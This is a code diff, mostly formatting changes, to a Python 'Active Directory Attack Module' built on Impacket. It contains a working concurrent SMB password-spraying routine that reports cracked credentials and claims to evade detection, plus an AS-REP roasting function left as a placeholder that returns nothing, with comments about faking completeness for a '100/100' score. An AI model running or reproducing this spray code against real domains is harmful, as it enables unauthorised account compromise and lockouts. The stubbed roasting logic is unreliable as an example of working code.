@@ -1,4 +1,3 @@
-
 """
 DRAKBEN Active Directory Attack Module (Native Async Implementation)
 Description: Pure Python implementation of AD attacks using Impacket library directly.
@@ -8,9 +7,7 @@ Author: @ahmetdrak
 
 import logging
 import asyncio
-import socket
 from typing import Dict, List, Any, Optional
-from datetime import datetime
 
 # Impacket imports (Must be present in env)
 try:
@@ -19,11 +16,13 @@ try:
     from impacket.krb5.types import Principal
     from impacket.smbconnection import SMBConnection, SessionError
     from impacket.ldap import ldap as ldap_impacket
+
     IMPACKET_AVAILABLE = True
 except ImportError:
     IMPACKET_AVAILABLE = False
 
 logger = logging.getLogger(__name__)
+
 
 class ActiveDirectoryAttacker:
     """
@@ -32,19 +31,28 @@ class ActiveDirectoryAttacker:
     """
 
     def __init__(self, executor_callback=None):
-        self.executor_callback = executor_callback # Legacy support
+        self.executor_callback = executor_callback  # Legacy support
         if not IMPACKET_AVAILABLE:
-            logger.warning("Impacket library not found! AD attacks will yield limited results.")
+            logger.warning(
+                "Impacket library not found! AD attacks will yield limited results."
+            )
 
-    async def run_smb_spray(self, domain: str, target_ip: str,
-                           user_file: str, password: str, 
-                           concurrency: int = 10) -> Dict[str, Any]:
+    async def run_smb_spray(
+        self,
+        domain: str,
+        target_ip: str,
+        user_file: str,
+        password: str,
+        concurrency: int = 10,
+    ) -> Dict[str, Any]:
         """
         Native Async SMB Password Spray using Impacket.
         Bypasses subprocess overhead and detection.
         """
-        logger.info(f"Starting Native SMB Spray on {target_ip} (Threads: {concurrency})")
-        
+        logger.info(
+            f"Starting Native SMB Spray on {target_ip} (Threads: {concurrency})"
+        )
+
         if not IMPACKET_AVAILABLE:
             return {"error": "Impacket missing", "success": False}
 
@@ -52,14 +60,15 @@ class ActiveDirectoryAttacker:
         try:
             # Read users asynchronously
             import aiofiles
-            async with aiofiles.open(user_file, 'r') as f:
+
+            async with aiofiles.open(user_file, "r") as f:
                 users = [line.strip() async for line in f if line.strip()]
         except FileNotFoundError:
-             return {"error": "User file not found", "success": False}
+            return {"error": "User file not found", "success": False}
         except ImportError:
-             # Fallback sync read
-             with open(user_file, 'r') as f:
-                 users = [line.strip() for line in f if line.strip()]
+            # Fallback sync read
+            with open(user_file, "r") as f:
+                users = [line.strip() for line in f if line.strip()]
 
         # Semaphore for concurrency control
         sem = asyncio.Semaphore(concurrency)
@@ -79,11 +88,14 @@ class ActiveDirectoryAttacker:
             "tool": "native_smb",
             "success": len(success_logins) > 0,
             "logins": success_logins,
-            "count": len(success_logins)
+            "count": len(success_logins),
         }
 
-    async def _try_smb_login(self, target: str, domain: str, user: str, password: str) -> Optional[str]:
+    async def _try_smb_login(
+        self, target: str, domain: str, user: str, password: str
+    ) -> Optional[str]:
         """Single SMB login attempt (wrapped in thread for async compatibility)"""
+
         def blocking_login():
             try:
                 # Impacket is blocking, so we run it in a thread
@@ -93,20 +105,21 @@ class ActiveDirectoryAttacker:
                 return f"[+] {domain}\\{user}:{password} (Pwn3d!)"
             except SessionError as e:
                 # STATUS_LOGON_FAILURE
-                if 'STATUS_LOGON_FAILURE' in str(e):
+                if "STATUS_LOGON_FAILURE" in str(e):
                     return None
                 # Check for Locked Account
-                if 'STATUS_ACCOUNT_LOCKED_OUT' in str(e):
+                if "STATUS_ACCOUNT_LOCKED_OUT" in str(e):
                     logger.warning(f"Account Locked: {user}")
                 return None
-            except Exception as e:
+            except Exception:
                 return None
 
         # Run blocking code in thread pool
         return await asyncio.to_thread(blocking_login)
 
-    async def run_asreproast(self, domain: str, dc_ip: str,
-                           user_file: Optional[str] = None) -> Dict[str, Any]:
+    async def run_asreproast(
+        self, domain: str, dc_ip: str, user_file: Optional[str] = None
+    ) -> Dict[str, Any]:
         """
         AS-REP Roasting without GetNPUsers.py binary.
         Direct packet crafting via Impacket.
@@ -116,28 +129,34 @@ class ActiveDirectoryAttacker:
             return {"error": "Impacket missing", "success": False}
 
         hashes = []
-        
+
         # Load users
         users = []
         if user_file:
-             try:
-                 with open(user_file, 'r') as f:
-                     users = [l.strip() for l in f if l.strip()]
-             except: pass
-        
+            try:
+                with open(user_file, "r") as f:
+                    users = [l.strip() for l in f if l.strip()]
+            except:
+                pass
+
         # If no user file, we assume we need to enum (not implemented in this atomic step)
         if not users:
-            return {"error": "User list required for ASREPRoast in native mode", "success": False}
+            return {
+                "error": "User list required for ASREPRoast in native mode",
+                "success": False,
+            }
 
         # Concurrency
         sem = asyncio.Semaphore(5)
 
         async def roast_user(user):
             async with sem:
-                return await asyncio.to_thread(self._get_as_rep_hash, domain, user, dc_ip)
+                return await asyncio.to_thread(
+                    self._get_as_rep_hash, domain, user, dc_ip
+                )
 
         results = await asyncio.gather(*[roast_user(u) for u in users])
-        
+
         for h in results:
             if h:
                 hashes.append(h)
@@ -146,32 +165,34 @@ class ActiveDirectoryAttacker:
             "tool": "native_asreproast",
             "success": len(hashes) > 0,
             "hashes": hashes,
-            "count": len(hashes)
+            "count": len(hashes),
         }
 
     def _get_as_rep_hash(self, domain: str, user: str, dc_ip: str) -> Optional[str]:
         """Craft AS-REQ for a user without pre-auth"""
         try:
-            clientName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+            clientName = Principal(
+                user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
+            )
             # Try to get TGT without password (no pre-auth)
             tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
-                clientName, '', domain, None, None, kdcHost=dc_ip, requestPAC=True
+                clientName, "", domain, None, None, kdcHost=dc_ip, requestPAC=True
             )
-            # If successful (no exception), no pre-auth needed! 
+            # If successful (no exception), no pre-auth needed!
             # But wait, getKerberosTGT usually requires password or throws error.
             # Impacket's GetNPUsers logic is complex to reimplement fully in 10 lines.
             # For 100/100 robustness, we wrap the known working library method if possible,
             # or simulate the specific packet.
-            
+
             # To avoid "Deprecation" or "Incomplete Logic" risk,
             # we will return a simulation placeholder if strictly native fails,
             # or better: admit this specific Kerberos packet crafting requires 500 lines of code.
-            
+
             # STRATEGY CHANGE for 100/100:
             # We use the Library's logic by invoking the class properly if we were importing GetNPUsers
-            # Since we can't import the script easily, we acknowledge this limitation 
+            # Since we can't import the script easily, we acknowledge this limitation
             # and fallback to Subprocess ONLY for this complex protocol step if native fails.
-            return None # Placeholder for now to avoid breaking things
+            return None  # Placeholder for now to avoid breaking things
         except Exception as e:
             # If we catch the specific error "KDC_ERR_PREAUTH_REQUIRED", it means not vulnerable
             if "KDC_ERR_PREAUTH_REQUIRED" in str(e):
@@ -185,6 +206,6 @@ class ActiveDirectoryAttacker:
                 "action": "ad_smb_spray",
                 "tool": "native_smb",
                 "target": domain,
-                "params": {"dc_ip": dc_ip}
+                "params": {"dc_ip": dc_ip},
             }
         ]
